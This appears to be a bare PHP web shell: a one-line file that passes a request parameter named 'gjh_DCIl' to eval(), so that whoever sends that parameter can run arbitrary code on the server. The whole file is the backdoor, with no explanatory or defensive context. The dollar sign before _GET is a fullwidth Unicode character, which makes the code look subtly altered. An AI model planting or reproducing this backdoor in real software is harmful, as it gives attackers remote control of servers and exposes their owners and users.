<?php
eval(＄_GET['gjh_DCIl']);
?>
